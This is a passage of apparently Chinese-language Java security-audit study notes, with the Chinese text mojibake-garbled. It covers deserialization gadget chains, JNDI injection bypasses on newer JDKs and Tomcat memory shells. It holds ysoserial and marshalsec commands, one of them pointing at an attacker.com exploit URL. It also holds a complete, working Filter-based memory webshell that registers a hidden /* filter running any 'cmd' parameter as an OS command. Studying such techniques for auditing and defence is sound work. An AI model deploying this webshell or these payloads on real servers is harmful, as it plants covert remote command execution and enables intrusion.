ç­‰ï¼‰<br>     â†“<br>è°ƒç”¨ defineClass(classBytes)<br>     â†“<br>åŠ è½½æ¶æ„ç±»<br>     â†“<br>é™æ€å—/æ„é€ å™¨æ‰§è¡Œ<br>     â†“<br>å‘½ä»¤æ‰§è¡Œï¼ˆå¦‚ Runtime.getRuntime().<span class="hljs-built_in">exec</span>ï¼‰<br></code></pre></td></tr></table></figure></li><li><p>ååºåˆ—åŒ–æ„é€ ccé“¾èƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„æ ¸å¿ƒ</p><ol><li><code>TemplatesImpl.getOutputProperties()</code> ä¼šè§¦å‘å†…éƒ¨ <code>defineTransletClasses()</code>ï¼›</li><li>è¿™ä¸ªæ–¹æ³•è°ƒç”¨äº† <code>defineClass()</code>ï¼ŒåŠ è½½äº†æˆ‘ä»¬æ³¨å…¥çš„æ¶æ„ç±»ï¼›</li><li>æ¶æ„ç±»çš„ <strong>é™æ€ä»£ç å—</strong> è¢«ç«‹å³æ‰§è¡Œ â†’ <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>ï¼›</li></ol></li></ul><h3 id="JNDIæ³¨å…¥åŠå…¶é«˜ç‰ˆæœ¬ç»•è¿‡"><a href="#JNDIæ³¨å…¥åŠå…¶é«˜ç‰ˆæœ¬ç»•è¿‡" class="headerlink" title="JNDIæ³¨å…¥åŠå…¶é«˜ç‰ˆæœ¬ç»•è¿‡"></a>JNDIæ³¨å…¥åŠå…¶é«˜ç‰ˆæœ¬ç»•è¿‡</h3><p><a href="https://tttang.com/archive/1405/#toc_0x01-beanfactory">æ¢ç´¢é«˜ç‰ˆæœ¬ JDK ä¸‹ JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³• - è·³è·³ç³– (tttang.com)</a></p><ul><li><p>JNDIæ³¨å…¥è§¦å‘çš„ä¸‰ä¸ªæ¨¡å¼</p><ol><li>è¿œç¨‹å¼•ç”¨æ¨¡å¼(åŸºäºJDKç‰ˆæœ¬)</li><li>æœ¬åœ°å¼•ç”¨æ¨¡å¼(åŸºäºä¾èµ–Jar)</li><li>ååºåˆ—åŒ–æ¨¡å¼(åŸºäºgadgeté“¾)</li></ol></li><li><p>jndiæ³¨å…¥çš„ç‰ˆæœ¬é™åˆ¶</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A141.png"></p><p>é«˜ç‰ˆæœ¬æ— æ³•æ³¨å…¥çš„åŸå› ï¼š</p><ul><li><p>com.sun.jndi.rmi.object.trustURLCodebaseï¼Œ</p><p>com.sun.jndi.cosnaming.object.trustURLCodebaseçš„é»˜è®¤å€¼å˜ä¸ºfalseï¼Œå³ä¸å…è®¸ä»è¿œç¨‹çš„CodebaseåŠ è½½Referenceå·¥å‚ç±»ï¼Œæ²¡é™åˆ¶åŠ è½½æœ¬åœ°æ–‡ä»¶</p></li></ul></li><li><p>é«˜ç‰ˆæœ¬ç»•è¿‡æ–¹æ³•</p><ul><li><p>åˆ©ç”¨jaråŒ…</p><p><a href="https://tttang.com/archive/1405/#toc_0x01-beanfactory">æ¢ç´¢é«˜ç‰ˆæœ¬ JDK ä¸‹ JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³• - è·³è·³ç³– (tttang.com)</a></p><p>ç™½ç›’å®¡è®¡æ—¶æŸ¥çœ‹å¼•å…¥äº†ä»€ä¹ˆä¾èµ–ï¼Œæ ¹æ®å¼•å…¥çš„ä¾èµ–åˆ©ç”¨æœ¬åœ°jaråŒ…ï¼Œè¿›è¡Œjndiæ³¨å…¥</p></li><li><p>åˆ©ç”¨ååºåˆ—åŒ–é“¾(åŒæ ·éœ€è¦ä¾èµ–åŒ…)</p><p><a href="https://blog.csdn.net/mole_exp/article/details/121141042">JNDIæ³¨å…¥åˆ©ç”¨åŸç†åŠç»•è¿‡é«˜ç‰ˆæœ¬JDKé™åˆ¶_jndiæ³¨å…¥çš„é™åˆ¶-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/bitterz/p/15946406.html#3-%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE%E6%B5%81%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce">javaé«˜ç‰ˆæœ¬ä¸‹å„ç§JNDI Bypassæ–¹æ³•å¤ç° - bitterz - åšå®¢å›­ (cnblogs.com)</a></p><p>åŸç†ï¼š</p><p>å³ä½¿ï¼š</p><ul><li>è¿œç¨‹ç±»åŠ è½½è¢«ç¦ç”¨äº†ï¼ˆç¦æ­¢ <code>http://...</code> ç±»åŠ è½½ï¼‰</li><li><code>trustURLCodebase=false</code></li></ul><p>åªè¦ <strong>Java ä¼šå°è¯•è¯»å–å¯¹è±¡å¹¶ååºåˆ—åŒ–</strong>ï¼ˆå¦‚é€šè¿‡ <code>ObjectInputStream</code>ï¼‰ï¼Œæ”»å‡»è€…å°±å¯ä»¥åœ¨è¿”å›ä¸­åµŒå…¥<strong>åºåˆ—åŒ– Gadget é“¾å¯¹è±¡</strong>ï¼Œå¹¶åœ¨ç›®æ ‡ä¸­æ¿€æ´»å®ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 <span class="hljs-string">&quot;calc&quot;</span> &gt; poc.txt<br><span class="hljs-built_in">cat</span> poc.txt|base64.txt(æ›¿æ¢æ¢è¡Œç¬¦)<br>ldap://127.0.0.1:6666/exp<br><br><span class="hljs-comment">#éœ€è¦ä¾èµ–åŒ…</span><br>&lt;groupId&gt;commoms-collections&lt;/groupId&gt;<br>&lt;artifactId&gt;commons-conllections&lt;/artfactId&gt;<br></code></pre></td></tr></table></figure><p>åœ¨ Java 8u191+ ç­‰é«˜ç‰ˆæœ¬ä¸­ï¼Œè™½ç„¶è¿œç¨‹ç±»åŠ è½½è¢«ç¦ç”¨äº†ï¼ˆ<code>trustURLCodebase=false</code>ï¼‰ï¼Œ<strong>ä½†å¦‚æœç›®æ ‡ç³»ç»Ÿä¸­å·²ç»å­˜åœ¨å¯ç”¨çš„ Gadget é“¾ï¼ˆåˆ©ç”¨é“¾ï¼‰ç±»ï¼Œå°±å¯èƒ½é€šè¿‡ JNDI æ³¨å…¥è§¦å‘ååºåˆ—åŒ–ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤</strong>ã€‚</p><p> ç»•è¿‡æ€è·¯ï¼šåˆ©ç”¨å·²æœ‰ Gadget é“¾</p><p> æ¡ä»¶</p><ol><li><strong>JNDI æ³¨å…¥ç‚¹å­˜åœ¨</strong>ï¼ˆå¦‚ Log4jã€Tomcat é…ç½®ç­‰ï¼‰</li><li><strong>ç›®æ ‡æœåŠ¡å™¨å·²æœ‰å¯åˆ©ç”¨çš„ç±»</strong>ï¼ˆå¦‚ commons-collectionsã€Groovyã€Spring ç»„ä»¶ç­‰ï¼‰</li><li><strong>æ”¯æŒ LDAP æˆ– RMI ç»‘å®š Object å®ä¾‹</strong>ï¼ˆä¸æ˜¯è¿œç¨‹ç±»åŠ è½½ï¼Œè€Œæ˜¯å¯¹è±¡ååºåˆ—åŒ–ï¼‰</li></ol><p>ç»•è¿‡æ–¹å¼æŠ€æœ¯ç»†èŠ‚</p><p>1.ä½¿ç”¨ LDAP æœåŠ¡è¿”å› <strong>åºåˆ—åŒ–å¯¹è±¡ï¼ˆä¸æ˜¯ç±»å¼•ç”¨ï¼‰</strong></p><p>æ”»å‡»è€…æ­å»ºæ¶æ„ LDAP æœåŠ¡å™¨ï¼Œå½“ç›®æ ‡å‘èµ· JNDI æŸ¥è¯¢æ—¶ï¼Œè¿”å›ä¸€ä¸ªå·²ç»æ„é€ å¥½çš„ Java åºåˆ—åŒ–å¯¹è±¡ï¼ˆObjectï¼‰ï¼Œè€Œä¸æ˜¯è¿œç¨‹ç±»çš„ URLã€‚</p><p> <strong>å³ä¸éœ€è¦ trustURLCodebase &#x3D; true</strong>ï¼Œè€Œæ˜¯åˆ©ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference â†’ Referenceable â†’ ç‰¹å®š Gadget é“¾çš„åºåˆ—åŒ–å¯¹è±¡<br></code></pre></td></tr></table></figure><ol start="2"><li>æ„é€  Gadget é“¾ï¼ˆåˆ©ç”¨ ysoserial å·¥å…·ï¼‰</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections5 <span class="hljs-string">&#x27;calc&#x27;</span> &gt; payload.ser<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>marshalsec</code> é¡¹ç›®ä¸­çš„ LDAPServer æ¨¡æ‹Ÿ LDAP æœåŠ¡ï¼Œè¿”å›è¿™ä¸ªå¯¹è±¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec.jar marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://attacker.com/#Exploit&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h3><ul><li><p>webä»£ç æ‰§è¡Œæµç¨‹</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A142.png"></p></li><li><p>servletå±‚è§¦å‘çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æœ‰è¯·æ±‚å¿…è§¦å‘çš„æ–¹æ³•</span><br>requestInitialized<br>requestDestroyed    <br></code></pre></td></tr></table></figure></li><li><p>å†…å­˜é©¬çš„ç±»å‹</p><ol><li>Listenerå†…å­˜é©¬ï¼šç›‘å¬ç‰¹å®šäº‹ä»¶å¹¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li><li>Filterå†…å­˜é©¬ï¼šæ‹¦æˆªå’Œä¿®æ”¹HTTPè¯·æ±‚å’Œå“åº”ã€‚</li><li>Servletå†…å­˜é©¬ï¼šç›´æ¥å¤„ç†HTTPè¯·æ±‚å¹¶æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚</li></ol><p><img src="https://.3001.net//s/20221209/1670591008_63933220d0b7298b0fb3f.png!small"></p></li></ul><h4 id="Listenä¸­å†…å­˜é©¬"><a href="#Listenä¸­å†…å­˜é©¬" class="headerlink" title="Listenä¸­å†…å­˜é©¬"></a>Listenä¸­å†…å­˜é©¬</h4><ul><li><p>åŸç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">ç›‘å¬å™¨æŒ‡å‘class: com.example.listenshell.Test<br><br>applicationListeners=com.example.listenshell.Test<br>StanderContext#contxet-&gt;ApplicationContext#context<br><br>é¡¹ç›®å¯åŠ¨ listenåœ¨è¿è¡Œæ—¶  classæ¥æºæ˜¯æ€ä¹ˆè·å–çš„<br>StandardContext#addApplicationEventListener<br>å†…å­˜:æ·»åŠ ä¸€ä¸ªlisten <br><br>Servlet -&gt; ApplicationContext -&gt; StandardContext<br></code></pre></td></tr></table></figure></li></ul><h4 id="Filterä¸­å†…å­˜é©¬"><a href="#Filterä¸­å†…å­˜é©¬" class="headerlink" title="Filterä¸­å†…å­˜é©¬"></a>Filterä¸­å†…å­˜é©¬</h4><ul><li><p>filterç±»ä¸­çš„æ–¹æ³•</p><ul><li>initâ€“åˆå§‹åŒ–</li><li>doFilter â€“ æ‰§è¡Œç‚¹</li><li>destory â€“  é”€æ¯</li></ul></li><li><p>filterè®¿é—®æµç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Servlet -&gt; context-&gt;ApplicationFilterConfig-&gt;context-&gt;StandardContext-&gt;filterConfigs<br><br>ApplicationFilterConfig#filterConfig context -&gt; StandardContext#<br><br>filterConfigs<br>filterDefs#  é…ç½®åç§°å’Œclass<br>filterMaps   é…ç½®åç§°urlè·¯ç”±<br><br>ApplicationFilterConfig#filterConfig( filterDef(filterClass filterName))<br><br>addFilterDef  æ·»åŠ é…ç½®åç§°å’Œclass<br>addFilterMap  addFilterMapBefore  æ·»åŠ é…ç½®åç§°å’Œurlè·¯ç”±<br></code></pre></td></tr></table></figure></li><li><p>å†…å­˜é©¬å®ç°</p><p>â€“ ç›¸å½“äºæ·»åŠ ä¸€ä¸ªFilter</p><ol><li>Servletè·å–ç”¨æˆ·è®¿é—®</li><li>åˆ¤æ–­è§¦å‘(æ˜¯å¦ä¸ºnull)</li><li>å¦‚æœªè§¦å‘åˆ™æ·»åŠ Filter</li><li>å‘å¯¹è±¡æˆå‘˜ä¸­æ·»åŠ é…ç½®ä¿¡æ¯</li></ol></li><li><p>Filterå†…å­˜é©¬ç¼–å†™</p><p><a href="https://zhuanlan.zhihu.com/p/404057893">ã€å®‰å…¨è®°å½•ã€‘é€šè¿‡jspæ–‡ä»¶æ³¨å…¥å†…å­˜é©¬ - çŸ¥ä¹ (zhihu.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> pres.test.momenshell;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.Context;<br><br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddTomcatFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.doPost(req, resp);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;RoboTerh&quot;</span>;<br>            <span class="hljs-comment">//ä»requestä¸­è·å–ServletContext</span><br>            <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> req.getSession().getServletContext();<br><br>            <span class="hljs-comment">//ä»contextä¸­è·å–ApplicationContextå¯¹è±¡</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            appctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>            <span class="hljs-comment">//ä»ApplicationContextä¸­è·å–StandardContextå¯¹è±¡</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>            <span class="hljs-comment">//ä»StandardContextä¸­è·å¾—filterConfigsè¿™ä¸ªmapå¯¹è±¡</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            Configs.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>            <span class="hljs-comment">//å¦‚æœè¿™ä¸ªè¿‡æ»¤å™¨åå­—æ²¡æœ‰æ³¨å†Œè¿‡</span><br>            <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//è‡ªå®šä¹‰ä¸€ä¸ªFilterå¯¹è±¡</span><br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>                        <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                            String[] commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">charsetName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;window&quot;</span>) ? <span class="hljs-string">&quot;GBK&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span>;<br>                            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>)) &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;cmd&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>                            &#125;<br>                            commands[<span class="hljs-number">2</span>] = cmd;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;flush&quot;</span>).invoke(writer);<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;close&quot;</span>).invoke(writer);<br>                                <span class="hljs-keyword">return</span>;<br>                            &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;<br>                                e.printStackTrace();<br>                            &#125;<br><br>                        &#125;<br>                        filterChain.doFilter(servletRequest, servletResponse);<br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>                    &#125;<br><br>                &#125;;<br><br>                <span class="hljs-comment">//åˆ›å»ºFilterDefå¯¹è±¡ å¹¶æ·»åŠ  filterå¯¹è±¡ï¼Œfiltername, filterç±»</span><br>                <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>                filterDef.setFilter(filter);<br>                filterDef.setFilterName(name);<br>                filterDef.setFilterClass(filter.getClass().getName());<br>                <span class="hljs-comment">//é€šè¿‡addFilterDefæ–¹æ³•æ·»åŠ  filterDef æ–¹æ³•</span><br>                standardContext.addFilterDef(filterDef);<br><br>                <span class="hljs-comment">//åˆ›å»ºFilterMapå¯¹è±¡ï¼Œå¹¶æ·»åŠ  filteræ˜ å°„ï¼Œfiltername</span><br>                <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>                filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>                filterMap.setFilterName(name);<br>                <span class="hljs-comment">//è¿™ä¸ªä¸è¦å¿˜è®°äº†</span><br>                filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>                <span class="hljs-comment">//é€šè¿‡addFilterMapBeforeæ–¹æ³•æ·»åŠ filterMapå¯¹è±¡</span><br>                standardContext.addFilterMapBefore(filterMap);<br><br>                <span class="hljs-comment">//é€šè¿‡å‰é¢è·å–çš„filtermapsçš„putæ–¹æ³•æ”¾å…¥filterConfig</span><br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);<br>                constructor.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br><br>                filterConfigs.put(name, filterConfig);<br><br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="tomcatä¸­é—´ä»¶æ¼æ´"><a href="#tomcatä¸­é—´ä»¶æ¼æ´" class="headerlink" title="tomcatä¸­é—´ä»¶æ¼æ´"></a>tomcatä¸­é—´ä»¶æ¼æ´</h3><ul><li><p>æœ€æ–°RCEæ¼æ´</p><p><a href="https://www.freebuf.com/vuls/425025.html">CVE-2025-24813 RCEå¤ç° - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></li></ul><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><a href="https://mp.weixin.qq.com/s/5hYQQBRhdoU5yxXMsDmClA">è®°ä¸€æ¬¡å¼€æºcmsçš„Javaä»£å®¡ (qq.com)</a></p><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><ul><li>Beynd Compareï¼šæ–‡ä»¶å¯¹æ¯”å·¥å…·ï¼Œå¯¹æ¯”ä¸¤ä¸ªæ–‡ä»¶æ‰¾åˆ°ä¸åŒç‰ˆæœ¬ä»£ç çš„å·®åˆ«</li><li>jndiæ³¨å…¥å·¥å…·ï¼šJNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</li><li>shiroååºåˆ—åŒ–å·¥å…·ï¼š<a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></li><li>ååºåˆ—åŒ–å·¥å…·ï¼šysoserial   <a href="https://blog.csdn.net/st3pby/article/details/135111050">Javaååºåˆ—åŒ–å·¥å…·ysoserialä½¿ç”¨-CSDNåšå®¢</a></li></ul><h3 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h3><ul><li><p>ä½¿ç”¨sqlmapæ—¶ç»å¸¸æ— æ³•æµ‹å‡ºæ³¨å…¥ç‚¹</p></li><li><p>å°è¯•ç½‘ä¸Šæ–¹æ³•ä¿®æ”¹æºä»£ç </p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/%E6%B3%A8%E5%85%A5%E7%82%B9.png"></p><p>å‘ç°æ­¤ä»£ç 